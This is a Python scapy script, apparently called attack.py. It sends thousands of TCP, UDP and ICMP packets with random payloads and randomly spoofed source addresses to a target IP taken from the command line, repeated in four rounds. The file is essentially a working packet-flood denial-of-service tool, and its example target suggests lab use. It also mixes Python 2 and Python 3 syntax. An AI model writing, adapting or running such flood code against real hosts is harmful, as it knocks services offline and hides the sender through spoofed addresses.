import sys
import time
from os import popen
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import sendp, IP, UDP, Ether, TCP , ICMP
from random import randrange
import time
import random
from py_essentials import simpleRandom

def generateSourceIP():
    not_valid = [10, 127, 254, 255, 1, 2, 169, 172, 192]
    first = randrange(1, 256)
    while first in not_valid:
        first = randrange(1, 256)
    ip = ".".join([str(first), str(randrange(1,256)), str(randrange(1,256)), str(randrange(1,256))])
    return ip

def main():
    for i in range (1, 5):
        launchAttack()
        time.sleep (10)

def launchAttack():
  #eg, python attack.py 10.0.0.64, where destinationIP = 10.0.0.64
  destinationIP = sys.argv[1:]
  #print destinationIP
  interface = popen('ifconfig | awk \'/eth0/ {print $1}\'').read()

  for i in xrange(0, 5000):
    randd = random.random()
    srcip = generateSourceIP ()
    dstip = destinationIP
    if randd >= 0.5: 
        packets = Ether() / IP(dst = dstip, src =srcip) / TCP(dport = 80, sport = 20) / str(simpleRandom.randomString(random.randint(0,1300)))
        print((repr(packets)[:81]))
        sendp(packets, iface = interface.rstrip(), inter = 0.1,count=1)
    elif randd < 0.5 and randd >0.3:
        packets = Ether() / IP(dst = dstip, src =srcip) / UDP(dport = 80, sport = 20) / str(simpleRandom.randomString(random.randint(0,1000)))
        print((repr(packets)[:81]))
        sendp(packets, iface = interface.rstrip(), inter = 0.1,count=1)
    else:
        packets = Ether() / IP(dst = dstip, src =srcip) / ICMP() / str(simpleRandom.randomString(random.randint(0,700)))
        print((repr(packets)[:81]))
        sendp(packets, iface = interface.rstrip(), inter = 0.1,count=1)

if __name__=="__main__":
  main()
                                                                                                                                                                                                                                                                                                       
